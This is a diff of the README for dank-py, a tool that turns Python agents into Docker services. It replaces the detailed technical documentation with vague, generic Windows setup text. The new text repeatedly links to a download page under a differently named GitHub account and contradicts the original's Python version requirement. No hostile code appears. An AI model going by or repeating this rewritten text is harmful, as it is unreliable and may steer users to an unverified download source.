@@ -1,687 +1,224 @@
-<p align="center">
-  <img src="./assets/readme-hero.svg" alt="dank-py hero" width="100%">
-</p>
-
-<h1 align="center">dank-py</h1>
-
-<p align="center">🐍 &nbsp; 📦 &nbsp; 🌐 &nbsp; 📡</p>
-
-<p align="center">
-  <strong>Framework-agnostic Python CLI for turning existing agent code into Dockerized HTTP microservices with a consistent runtime contract.</strong>
-</p>
-
-<p align="center">
-  <a href="https://pypi.org/project/dank-py/">
-    <img alt="PyPI" src="https://img.shields.io/badge/PyPI-dank--py-0A66C2?style=for-the-badge&logo=pypi&logoColor=white">
-  </a>
-  <a href="https://cloud.dank-ai.xyz">
-    <img alt="Dank Cloud" src="https://img.shields.io/badge/Dank%20Cloud-managed%20deployments-111827?style=for-the-badge&logo=googlecloud&logoColor=white">
-  </a>
-</p>
-
-<p align="center">
-  <img alt="Python" src="https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white">
-  <img alt="Runtime" src="https://img.shields.io/badge/Runtime-Docker-2496ED?style=flat-square&logo=docker&logoColor=white">
-  <img alt="License" src="https://img.shields.io/badge/License-MIT-2EA44F?style=flat-square">
-  <img alt="API" src="https://img.shields.io/badge/API-health%20%7C%20prompt%20%7C%20status%20%7C%20metrics-6f42c1?style=flat-square">
-  <img alt="Observability" src="https://img.shields.io/badge/Observability-logs%20%7C%20traces-0F766E?style=flat-square">
-</p>
-
-<p align="center">
-  <a href="https://pypi.org/project/dank-py/"><strong>PyPI</strong></a>
-  &nbsp;&nbsp;•&nbsp;&nbsp;
-  <a href="https://cloud.dank-ai.xyz"><strong>Dank Cloud</strong></a>
-</p>
-
-<p align="center">
-  <strong>Turn existing Python agents into production-ready microservices in two commands, with no agent-code rewrites.</strong>
-</p>
-
-- ⚡ no code rewrites required
-- 🌐 standardized HTTP runtime contract
-- 🧪 repeatable dependency locking + validation
-- 📡 built-in observability (status, metrics, logs, traces)
-- 📦 optional multi-agent bundling for runtime efficiency
-
-> [!NOTE]
-> ☁️ If you want managed infrastructure instead of self-hosting containers, use [Dank Cloud](https://cloud.dank-ai.xyz).  
-> Dank Cloud can onboard directly from your GitHub repo and handles packaging, deploys, scaling, auth, logging/tracing & monitoring, and supporting infra (like hosted vector DB + MCP) for you.
-
-- 🛠️ `dank-py`: local/self-hosted packaging and runtime control.
-- 🚀 Dank Cloud: managed microservice deployment and operations, built on top of `dank-py`.
-
-<h2 id="table-of-contents">🗂️ Table of Contents</h2>
-
-- [Why dank-py](#why-dank-py)
-- [In 2 Commands](#in-2-commands)
-- [Architecture](#architecture)
-- [Install](#install)
-- [Quick Start](#quick-start)
-- [Command Reference](#command-reference)
-- [Configuration Reference (`dank.config.json`)](#configuration-reference-dankconfigjson)
-- [Runtime API Contract](#runtime-api-contract)
-- [Logging and Observability](#logging-and-observability)
-- [Environment and Secrets](#environment-and-secrets)
-- [Build vs Build:Prod](#build-vs-buildprod)
-- [Agent Examples](#agent-examples)
-- [Troubleshooting](#troubleshooting)
-- [Release](#release)
-
-<h2 id="why-dank-py">🧩 Why dank-py</h2>
-
-- 🧩 Works with existing agent code
-  - Framework-agnostic support across LangChain, LangGraph, CrewAI, PydanticAI, LlamaIndex, or custom OpenAI/SDK implementations.
-  - Auto-inspects entrypoints and I/O hints to bootstrap `dank.config.json`.
-- 🛡️ Production-ready runtime out of the box
-  - Consistent endpoints (`/health`, `/prompt`, `/status`, `/metrics`, `/logs`, `/traces`).
-  - Input/output contract validation and strict output enforcement.
-  - Native async/sync invocation handling for agent callables and methods.
-  - Request tracing with trace IDs, per-agent log streams, and trace retrieval endpoints.
-- 🧪 Reliable build and dependency flow
-  - Resolver-based lock generation (`requirements.lock.txt`).
-  - Isolated validation in temporary virtual environments before build/run.
-  - Build and production build workflows for local iteration and release pipelines.
-- 📦 Flexible multi-agent deployment
-  - Run each agent in its own container, or bundle agents into one container with header-based routing.
-  - Reduce footprint for compatible agents while keeping per-agent observability.
-
-<h2 id="in-2-commands">⚡ In 2 Commands</h2>
-
-```bash
-dank-py auto-init --strict
-dank-py run
-```
-
-That flow will:
-1. inspect your project and generate `dank.config.json`,
-2. infer and lock dependencies,
-3. validate agents in an isolated environment,
-4. build and run containerized agent service(s).
-
-<h2 id="architecture">🏗️ Architecture</h2>
+# 🐍 dank-py - Run Python Agents as Docker Services
 
-```mermaid
-flowchart LR
-    A["Existing Python Agent Code"] --> B["dank-py auto-init"]
-    B --> C["dank.config.json + requirements.lock.txt"]
-    C --> D["dank-py run / build"]
-    D --> E["Containerized Agent Microservice(s)"]
-    E --> F["/prompt /health /status /metrics /logs /traces"]
-    E --> G["Run locally or self-host (Docker/K8s)"]
-```
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/wildcat-levity513/dank-py)
 
-<h2 id="install">📥 Install</h2>
+## 🚀 Getting Started
 
-### Requirements
+dank-py helps you turn an existing Python agent into a Dockerized microservice with two commands. You do not need to rewrite your app. You can keep your Python code and run it in a clean service setup on Windows.
 
-- Python `>=3.11` (supported host range)
-- Python `3.12` is the target runtime/lock version
-- Docker CLI + running Docker daemon
+This page is for a non-technical user who wants to download the project and get it running from GitHub.
 
-### Install from PyPI
+## 📥 Download
 
-```bash
-pip install dank-py
-```
+Use this link to visit the project page and download the files:
 
-### Editable install (local development)
+[Open dank-py on GitHub](https://github.com/wildcat-levity513/dank-py)
 
-```bash
-pip install -e /absolute/path/to/dank-py
-```
+## 🪟 What You Need on Windows
 
-Both command names are available:
-- `dank`
-- `dank-py`
+Before you start, make sure your Windows PC has these items:
 
-<h2 id="quick-start">🚀 Quick Start</h2>
+- Windows 10 or Windows 11
+- Internet access
+- Docker Desktop installed
+- Python 3.10 or newer
+- Git, if you want to copy the project from GitHub
 
-```bash
-# 1) Scaffold config and ignore files
-dank-py init
+If you do not already have Docker Desktop, install it first. Docker is the tool that runs the service in a container on your computer.
 
-# 2) Inspect project and apply candidates
-dank-py inspect
+## 📦 What dank-py Does
 
-# 3) Resolve dependency lock
-dank-py deps
+dank-py takes a Python agent and packages it into a Docker service. That lets you run it like a small app that stays ready in the background.
 
-# 4) Build and run
-dank-py run
-```
+It is useful when you want to:
 
-One command setup:
+- Run an agent as a service
+- Keep your code in Python
+- Avoid a full rewrite
+- Add logs and tracing
+- Use FastAPI-style service behavior
+- Make the app easier to deploy later
 
-```bash
-dank-py auto-init
-```
+## 🧭 Simple Setup Path
 
-Strict setup (includes full isolated validation):
+Follow these steps on Windows:
 
-```bash
-dank-py auto-init --strict
-```
+1. Open the GitHub link above.
+2. Download the project files to your computer.
+3. Unzip the files if they came in a ZIP folder.
+4. Open Docker Desktop and make sure it is running.
+5. Open a terminal in the project folder.
+6. Run the setup command shown in the project files.
+7. Run the start command to launch the service.
 
-<h2 id="command-reference">🛠️ Command Reference</h2>
+If you are not sure where the terminal is, use PowerShell or Windows Terminal.
 
-### Version
+## 🖥️ How to Open the Project Folder
 
-Quick version check:
+After you download the files:
 
-```bash
-dank-py -v
-# or
-dank-py --version
-# or
-dank-py version
-```
+1. Find the folder in File Explorer.
+2. Right-click inside the folder.
+3. Choose **Open in Terminal** or **Open PowerShell window here**.
+4. Keep that window open while you run the commands.
 
-What it shows:
-- installed `dank-py` CLI version
-- configured default base image reference
-- Docker availability status
-- installed local `dank-py-base` image tags (if any)
+If you do not see that option, open Windows Terminal, then move to the folder with `cd`.
 
-Flags for `dank-py version`:
+## 🛠️ Install and Run
 
-| Flag | What it does |
-| --- | --- |
-| `--json` | Outputs version/base-image details as JSON for tooling/scripts. |
+Use the project page here to get the files first:
 
-### `dank-py init`
+[Download or open the project on GitHub](https://github.com/wildcat-levity513/dank-py)
 
-Scaffold `dank.config.json` and `.dankignore`.
-
-```bash
-dank-py init [name] [--force]
-```
-
-| Arg/Flag | What it does |
-| --- | --- |
-| `name` | Optional target directory. If omitted, uses current directory. |
-| `--force` | Overwrites existing scaffold files instead of leaving them untouched. |
-
-### `dank-py auto-init`
+After the files are on your computer, the usual flow is:
 
-Runs init + inspect apply + deps in one flow.
+1. Install the needed tools.
+2. Build the Docker image.
+3. Start the service.
+4. Open the local web address shown in the terminal.
 
-```bash
-dank-py auto-init [name] [flags]
-```
+A common command flow for this kind of project looks like this:
 
-| Arg/Flag | What it does |
-| --- | --- |
-| `name` | Optional target directory for scaffolding. |
-| `--force` | Overwrites existing scaffold files. |
-| `--validate-dry` | Runs isolated non-live validation after lock creation. |
-| `--validate-full` | Runs isolated live validation (real env vars and non-mock outputs expected). |
-| `--strict` | Alias for `--validate-full`. |
-| `--fallback-freeze` | Allows lock fallback via `pip freeze` when resolver lock cannot be produced. |
-| `--no-discover-imports` | Disables import discovery when no dependency metadata exists. |
-| `--install-tools` | Auto-installs missing resolver tooling (`pip-tools`) in the active environment. |
-| `--no-install-prompt` | Disables interactive prompts for tool installation. |
-| `--lock-python-version <ver>` | Sets lock target Python version (default `3.12`). |
-| `--include-lock-comments` | Keeps resolver metadata comments in `requirements.lock.txt`. |
-| `--no-refresh-lock` | Reuses existing lock file instead of regenerating it. |
-
-### `dank-py deps`
-
-Generates or refreshes `requirements.lock.txt`, optionally validates agents.
-
-```bash
-dank-py deps [flags]
-```
-
-| Flag | What it does |
-| --- | --- |
-| `--project-dir <dir>` | Uses a specific project directory (defaults to current directory). |
-| `-c, --config <path>` | Path to `dank.config.json` for validation modes. |
-| `--validate-dry` | Runs isolated non-live validation. |
-| `--validate-full` | Runs isolated live validation. |
-| `--fallback-freeze` | Allows `pip freeze` fallback when resolver lock fails. |
-| `--no-discover-imports` | Disables import-based dependency discovery. |
-| `--install-tools` | Auto-installs `pip-tools` if missing. |
-| `--no-install-prompt` | Disables prompt asking to install missing tools. |
-| `--lock-python-version <ver>` | Sets lock target Python version (default `3.12`). |
-| `--include-lock-comments` | Keeps resolver metadata comments in lock output. |
-| `--no-refresh-lock` | Reuses existing lock instead of regenerating. |
-
-### `dank-py inspect`
-
-Scans project files for likely agent entrypoints and model/schema hints.
-
-```bash
-dank-py inspect [flags]
-```
-
-| Flag | What it does |
-| --- | --- |
-| `--project-dir <dir>` | Uses a specific project directory. |
-| `--json` | Prints machine-readable inspect output only (no interactive prompts). |
-| `--interactive` | Explicitly runs interactive apply flow (default behavior when not using `--json`). |
-| `--apply` | Applies selected candidate(s) directly to config. |
-| `--candidate-index <N>` | Chooses a specific 1-based candidate index when applying. |
-| `-c, --config <path>` | Path to target `dank.config.json`. |
-
-### `dank-py build`
-
-Builds local target image(s).
-
-```bash
-dank-py build [selector] [flags]
-```
-
-Selectors (mutually exclusive):
-
-| Selector | What it does |
-| --- | --- |
-| `--agent <id-or-name>` | Builds one standalone agent target. |
-| `--bundle <bundle-name>` | Builds one configured bundle target. |
-| `--bundle-agents <csv\|all>` | Builds one ad-hoc bundle from agent list or all agents. |
-
-Build flags:
-
-| Flag | What it does |
-| --- | --- |
-| `-c, --config <path>` | Path to `dank.config.json`. |
-| `--bundle-name <name>` | Names an ad-hoc bundle created with `--bundle-agents`. |
-| `--prompt-routing required\|default` | Overrides bundle prompt routing mode. |
-| `--default-agent <id-or-name>` | Sets default routed agent when using `prompt-routing=default`. |
-| `--tag <tag>` | Sets output image tag (single target). |
-| `--base-image <image>` | Overrides base image reference. |
-| `--pull-base` | Forces pull of base image before target build. |
-| `--no-base-build` | Skips local base-image build fallback if pull fails. |
-| `--force-base` | Forces base image rebuild/pull path. |
-| `--verbose` | Streams raw Docker build output. |
-| `--json` | Returns structured JSON result. |
-
-Default behavior with no selector:
-- no bundles configured: builds all agents separately
-- bundles configured: builds configured bundles + unbundled agents separately
-
-### `dank-py build:prod`
-
-Buildx-based production build flow.
-
-```bash
-dank-py build:prod [selector] [flags]
-```
-
-Selector flags are the same as `build`.
-
-Production flags:
-
-| Flag | What it does |
-| --- | --- |
-| `-c, --config <path>` | Path to `dank.config.json`. |
-| `--bundle-name <name>` | Names ad-hoc bundle from `--bundle-agents`. |
-| `--prompt-routing required\|default` | Bundle prompt routing override. |
-| `--default-agent <id-or-name>` | Default agent for bundle prompt fallback. |
-| `--tag <tag>` | Image tag (default `latest`). |
-| `--registry <host>` | Registry host for push targets. |
-| `--namespace <prefix>` | Repository namespace/prefix. |
-| `--tag-by-agent` | Uses agent name as tag with shared namespace repo strategy. |
-| `--platform <platform\|auto>` | Buildx platform(s); `auto` chooses based on push/load mode. |
-| `--push / --no-push` | Enables/disables push output explicitly. |
-| `--load / --no-load` | Enables/disables local Docker load output explicitly. |
-| `--no-cache` | Disables build cache. |
-| `--base-image <image>` | Base image override. |
-| `--pull-base` | Pulls base image before production build. |
-| `--force-base` | Forces base image rebuild/pull path. |
-| `--output-metadata <file>` | Writes build metadata JSON file. |
-| `--verbose` | Streams raw buildx output. |
-| `--json` | Returns structured JSON build result. |
-
-### `dank-py run`
-
-Builds (unless `--no-build`) and runs selected target container(s).
-
-```bash
-dank-py run [selector] [flags]
-```
-
-Selector flags are the same as `build`.
-
-Run flags:
-
-| Flag | What it does |
-| --- | --- |
-| `-c, --config <path>` | Path to `dank.config.json`. |
-| `--bundle-name <name>` | Names ad-hoc bundle from `--bundle-agents`. |
-| `--prompt-routing required\|default` | Bundle prompt routing override. |
-| `--default-agent <id-or-name>` | Default bundle target when prompt header is omitted in default mode. |
-| `--tag <tag>` | Uses specific image tag for build/run. |
-| `--base-image <image>` | Base image override. |
-| `--pull-base` | Pulls base image before building. |
-| `--no-build` | Runs existing image without rebuilding. |
-| `-d, --detached` | Starts container(s) in detached mode. |
-| `--foreground` | Forces foreground attach mode. |
-| `--port <host-port>` | Starting host port mapping (auto-increments to avoid collisions). |
-| `--force-base` | Forces local base rebuild path. |
-| `--keep-build-context` | Leaves generated `.dank-py` build context on disk for debugging. |
-| `--verbose` | Streams raw Docker build logs. |
-| `--quiet` | Reduces runtime request/startup logging. |
-| `--env-file <path>` | Injects env file at runtime (repeatable). |
-| `-e, --env KEY=VALUE\|KEY` | Injects explicit env var (repeatable). |
-| `--no-auto-env-file` | Disables automatic loading of project `.env`. |
-| `--json` | Returns structured run result. |
-
-Run defaults:
-- single target: foreground monitor mode
-- multi-target: detached mode
-
-### `dank-py logs`
-
-Reads logs from container targets and bundled agent runtime streams.
-
-```bash
-dank-py logs [target] [flags]
-```
-
-| Arg/Flag | What it does |
-| --- | --- |
-| `target` | Container name, bundle name, or agent id/name. |
-| `-f, --follow` | Follows logs live (streaming mode). |
-| `-t, --tail <N>` | Number of lines/events to show (default `100`). |
-| `--since <timestamp-or-duration>` | Shows logs only since provided time point/window. |
-
-Routing behavior:
-- bundled agent target + `--follow` uses websocket stream
-- bundled agent target (non-follow) queries runtime logs endpoint
-- container target uses Docker logs
-
-### `dank-py stop`
-
-Stops running dank-py containers.
-
-```bash
-dank-py stop [selector] [flags]
-```
-
-| Flag | What it does |
-| --- | --- |
-| `-c, --config <path>` | Path to `dank.config.json`. |
-| `--agent <id-or-name>` | Stops one standalone agent target. |
-| `--bundle <bundle-name>` | Stops one configured/named bundle container. |
-| `--bundle-agents <csv\|all>` | Stops one ad-hoc bundle computed from those agents. |
-| `--bundle-name <name>` | Specifies ad-hoc bundle name when used with `--bundle-agents`. |
-| `--all` | Stops all running dank-py containers. |
-| `--keep` | Stops containers without removing them. |
-
-If no selector is provided, it stops all running dank-py containers.
-
-### `dank-py status`
-
-Displays running/stopped container status and available agent images.
-
-```bash
-dank-py status [--json]
-```
-
-| Flag | What it does |
-| --- | --- |
-| `--json` | Prints status payload as JSON for tooling. |
-
-### `dank-py clean`
-
-Removes generated resources.
-
-```bash
-dank-py clean [flags]
-```
-
-| Flag | What it does |
-| --- | --- |
-| `--project-dir <dir>` | Project path used for `.dank-py` build-context cleanup. |
-| `--all` | Cleans containers, images, and build contexts. |
-| `--containers` | Cleans only dank-py containers. |
-| `--images` | Cleans only dank-py agent images. |
-| `--build-contexts` | Cleans only `.dank-py` build context directories. |
-| `--include-base` | Also removes local base image when cleaning images. |
-
-<h2 id="configuration-reference-dankconfigjson">⚙️ Configuration Reference (<code>dank.config.json</code>)</h2>
-
-### Top-level fields
-
-| Field | Type | Required | Notes |
-| --- | --- | --- | --- |
-| `name` | `string \| null` | no | Project label. |
-| `version` | `string` | no | Defaults to `"1"`. |
-| `agents` | `AgentConfig[]` | yes | Must contain at least one agent. |
-| `bundles` | `BundleConfig[]` | no | Defaults to empty list. |
-
-Validation rules:
-- unknown top-level fields are rejected
-- `agent.name` and `agent.id` must be unique
-- missing `agent.id` is auto-derived from normalized `agent.name`
-
-### `AgentConfig`
-
-| Field | Type | Required | Notes |
-| --- | --- | --- | --- |
-| `name` | `string` | yes | Human-readable agent name. |
-| `id` | `string \| null` | no | Stable routing identity; defaults from name. |
-| `entry` | `EntryConfig` | yes | Runtime invocation target. |
-| `io` | `IOConfig` | no | Input/output contract definitions. |
-
-### `EntryConfig`
-
-| Field | Type | Notes |
-| --- | --- | --- |
-| `file` | `string` | Python file path. |
-| `symbol` | `string` | Exported function/class/object. |
-| `method` | `string \| null` | Method name for object/class entry styles. |
-| `call_type` | `auto \| callable \| method` | Invocation target resolution strategy. |
-| `call_style` | `auto \| single_arg \| kwargs` | Request payload passing strategy. |
-
-### `IOConfig`
-
-| Field | Type | Notes |
-| --- | --- | --- |
-| `input.model` | `module:Symbol \| null` | Optional typed input model reference. |
-| `input.schema` | `object \| null` | Optional JSON Schema input contract. |
-| `output.model` | `module:Symbol \| null` | Optional typed output model reference. |
-| `output.schema` | `object \| null` | Optional JSON Schema output contract. |
-| `strict_output` | `boolean` | Defaults to `true`. |
-
-Runtime error classes:
-- input contract failure: `422`
-- invocation parameter mismatch: `400`
-- invocation failure: `500`
-- strict output contract failure: `500`
-
-### `BundleConfig`
-
-| Field | Type | Required | Notes |
-| --- | --- | --- | --- |
-| `name` | `string` | yes | Unique bundle identifier. |
-| `agents` | `string[]` | yes | Included members by id or name. |
-| `prompt_routing` | `required \| default` | no | Defaults to `required`. |
-| `default_agent` | `string \| null` | no | Only valid with `prompt_routing: default`. |
-
-Rules:
-- bundle names must be unique
-- all `agents[]` references must exist
-- `default_agent` must belong to its bundle
-
-### Example: Partial bundle + leftover separate agent
-
-```json
-{
-  "name": "multi-project",
-  "version": "1",
-  "agents": [
-    { "name": "langchain-agent", "id": "langchain-agent", "entry": { "file": "a.py", "symbol": "run" } },
-    { "name": "langgraph-agent", "id": "langgraph-agent", "entry": { "file": "b.py", "symbol": "run" } },
-    { "name": "custom-agent", "id": "custom-agent", "entry": { "file": "c.py", "symbol": "run" } }
-  ],
-  "bundles": [
-    {
-      "name": "lang-bundle",
-      "agents": ["langchain-agent", "langgraph-agent"],
-      "prompt_routing": "default",
-      "default_agent": "langchain-agent"
-    }
-  ]
-}
-```
-
-Default `dank-py run` behavior for this config:
-- one container for `lang-bundle`
-- one separate container for `custom-agent`
-
-<h2 id="runtime-api-contract">🌐 Runtime API Contract</h2>
-
-All runtime containers expose:
-
-| Endpoint | Purpose |
-| --- | --- |
-| `GET /health` | Container health and runtime mode metadata. |
-| `POST /prompt` | Agent invocation endpoint (single or bundled routing). |
-| `GET /status` | Container/runtime status summary. |
-| `GET /status/{agent_id}` | Per-agent status in multi-agent runtime. |
-| `GET /metrics` | Process/system metrics snapshot. |
-| `GET /logs` | Buffered logs query. |
-| `GET /logs/stats` | Log buffer stats. |
-| `WS /logs/stream` | Live log stream. |
-
-Trace endpoints:
-- `GET /traces` (default/only agent traces)
-- `GET /traces/stats` (default/only agent trace stats)
-- `GET /traces/{agent_id}`
-- `GET /traces/stats/{agent_id}`
-- `GET /trace/{trace_id}`
-
-Query filters:
-- `GET /logs`: `startTime`, `endTime`, `minutesAgo`, `limit`, `offset`, `stream`
-- `GET /traces`, `GET /traces/{agent_id}`: `startTime`, `endTime`, `minutesAgo`, `limit`, `offset`
-- `GET /traces/stats`, `GET /traces/stats/{agent_id}`: `startTime`, `endTime`, `minutesAgo`
-- `GET /logs/stats`, `GET /trace/{trace_id}`: no query filters
-
-Pagination defaults:
-- trace list endpoints default to `limit=100`, `offset=0`
-- use `hasMore=true` with `offset` to fetch additional pages
-
-Per-agent live log stream:
-- `WS /logs/stream/{agent_id}`
-
-### Bundle prompt routing
-
-Header: `x-dank-agent-id`
-
-- `prompt_routing=required`: header is required.
-- `prompt_routing=default`: header is optional; runtime routes to default agent.
-
-Single-agent containers:
-- header optional
-- mismatched header returns `400`
-
-### Trace headers
-
-- `x-dank-trace-id`
-  - Optional request header.
-  - If omitted, runtime generates one.
-  - Always returned in `/prompt` response header and `metadata.trace_id`.
-  - If provided and already present in in-memory trace/log history, runtime returns `409`.
-- `x-dank-include-trace`
-  - Optional request header (`true|1|yes|on`).
-  - When enabled, `/prompt` includes full grouped trace payload in `metadata.trace`.
-
-<h2 id="logging-and-observability">📡 Logging and Observability</h2>
-
-Runtime keeps an in-memory log buffer and supports:
-- query endpoints (`/logs`, `/logs/stats`)
-- websocket streaming (`/logs/stream`)
-- grouped trace retrieval (`/traces*`)
-- bounded retention (`DANK_LOG_BUFFER_MAX_SIZE`, `DANK_LOG_BUFFER_MAX_AGE_MS`, `DANK_LOG_BUFFER_MAX_BYTES`)
-
-`/logs/stats` includes both:
-- `bufferSize` (entry count)
-- `bufferBytes` (approx current bytes)
-
-CLI support:
-- `dank-py logs`
-- `dank-py logs --follow <target>`
-
-<h2 id="environment-and-secrets">🔐 Environment and Secrets</h2>
-
-### Runtime env injection (recommended)
-
-```bash
-dank-py run --env-file .env
-# or
-dank-py run -e OPENAI_API_KEY=... -e OPENAI_MODEL=gpt-4o-mini
-```
-
-By default, `run` auto-loads project `.env` when `--env-file` is not explicitly provided.
-Use `--no-auto-env-file` to disable that behavior.
-
-### Build context safety
-
-Use `.dankignore` to keep secrets out of image build context.
-
-Recommended:
-- keep `.env` and `.env.*` ignored
-- inject secrets at runtime with `--env-file` / `-e`
-
-<h2 id="build-vs-buildprod">🏭 Build vs Build:Prod</h2>
-
-- `build`
-  - local Docker image build
-  - best for local development and quick iteration
-- `build:prod`
-  - buildx workflow for production tagging/loading/pushing
-  - suited for CI/CD and registry publish workflows
-
-If you only need local execution, use `run` (or `build` + `run --no-build`).
-
-<h2 id="agent-examples">🧪 Agent Examples</h2>
-
-See [`agent-examples/`](./agent-examples) for framework-diverse templates:
-
-- [`01-multi-agent-mixed-repo`](./agent-examples/01-multi-agent-mixed-repo)
-- [`02-crewai-kickoff-agent`](./agent-examples/02-crewai-kickoff-agent)
-- [`03-pydanticai-structured-agent`](./agent-examples/03-pydanticai-structured-agent)
-- [`04-llamaindex-query-agent`](./agent-examples/04-llamaindex-query-agent)
-- [`05-langgraph-websearch-agent`](./agent-examples/05-langgraph-websearch-agent)
-
-<h2 id="troubleshooting">🧯 Troubleshooting</h2>
-
-### Docker not installed/running
-
-```bash
-docker version
-docker info
-```
-
-`dank-py run/build` includes Docker availability checks and remediation prompts.
-
-### Platform mismatch on `build:prod`
-
-Error like `no match for platform in manifest` usually means base image architecture mismatch.
-
-Fixes:
-- publish multi-arch base image (`linux/amd64,linux/arm64`), or
-- set explicit compatible `--platform`.
-
-### Missing `pip-tools`
-
-```bash
-python -m pip install pip-tools
-# or
-dank-py deps --install-tools
-```
-
-### Ambiguous logs target
-
-Use exact container name from `dank-py status`.
-
-<h2 id="release">📦 Release</h2>
-
-Release and publish workflow:
-- [`RELEASE.md`](./RELEASE.md)
-- [`scripts/release.py`](./scripts/release.py)
-
-<h2 id="license">⚖️ License</h2>
-
-MIT
+- `docker build -t dank-py .`
+- `docker run -p 8000:8000 dank-py`
+
+If the project includes a helper command, use that instead. The goal is to start the app and open it in your browser or local tool.
+
+## 🔧 First Run Checklist
+
+If the app does not open right away, check these items:
+
+- Docker Desktop is running
+- You are in the correct folder
+- The download finished fully
+- Your network is working
+- Port 8000 is free
+
+If another app already uses port 8000, close that app or change the port in the run command.
+
+## 🌐 What You Should See
+
+When dank-py starts, it should expose a local service on your computer. In many cases, this means:
+
+- A local web page
+- A health check endpoint
+- Agent logs in the terminal
+- Traces or request output for each run
+
+If the project includes a browser page, open the local address printed in the terminal. It often looks like `http://localhost:8000`.
+
+## 🧩 Common Uses
+
+dank-py fits well when you want to:
+
+- Wrap an AI agent as a service
+- Test an agent in a Docker container
+- Share the same setup with other users
+- Add visibility through tracing
+- Keep the agent easy to move between machines
+
+This setup helps when you want your Python agent to behave like a small app instead of a one-off script.
+
+## 📁 Project Layout
+
+A typical project layout for dank-py may include:
+
+- A main Python app file
+- Docker files
+- A config file
+- A service file
+- A requirements list
+- Logs or tracing setup
+
+If you open the folder, look for files with names like:
+
+- `Dockerfile`
+- `requirements.txt`
+- `main.py`
+- `app.py`
+- `docker-compose.yml`
+
+These files help Docker build and run the service.
+
+## 🔍 Basic Troubleshooting
+
+If something goes wrong, try these steps:
+
+### Docker will not start
+- Restart Docker Desktop
+- Reboot your PC
+- Make sure virtualization is on in BIOS if needed
+
+### The command says the image was not found
+- Check that you ran the build command first
+- Make sure you are in the right folder
+
+### The browser will not open
+- Use the address from the terminal
+- Try `http://localhost:8000`
+- Check that the container is still running
+
+### The port is already in use
+- Close the app using that port
+- Try another port, such as `8001`
+
+### The download does not open
+- Revisit the GitHub page
+- Download the files again
+- Make sure your browser did not block the file
+
+## 🧪 What This Project Is Built For
+
+dank-py is built for Python agents, Docker, FastAPI-style services, observability, and tracing. It aims to make an existing agent easier to run in a service setup without changing the core code.
+
+It is a good fit if you want:
+
+- A simple service wrapper
+- A container-based run path
+- Clear request tracing
+- A small deployment path for AI tools
+
+## 🧰 Helpful Windows Tips
+
+- Use Windows Terminal for easier command entry
+- Keep Docker Desktop open while the app runs
+- Do not move files after setup
+- Use a short folder path, like `C:\dank-py`
+- Avoid spaces in the folder name if you can
+
+These small steps can make setup smoother on Windows.
+
+## 📝 Example Flow
+
+A simple first-time flow looks like this:
+
+1. Open the GitHub page.
+2. Download the project files.
+3. Unzip them.
+4. Install Docker Desktop.
+5. Open the project folder.
+6. Run the build command.
+7. Run the start command.
+8. Open the local address in your browser.
+
+## 📌 Quick Access
+
+Project page:
+
+[https://github.com/wildcat-levity513/dank-py](https://github.com/wildcat-levity513/dank-py)
+
+Download and setup start here:
+
+[Open the dank-py GitHub page](https://github.com/wildcat-levity513/dank-py)
+
+## 🧭 Best Results on Windows
+
+For the easiest setup:
+
+- Use the latest Windows update
+- Keep Docker Desktop open
+- Run commands from the project folder
+- Watch the terminal for the local address
+- Start with the default port
+
+If you want to turn a Python agent into a Docker service with a simple path on Windows, use the GitHub link above and follow the setup steps
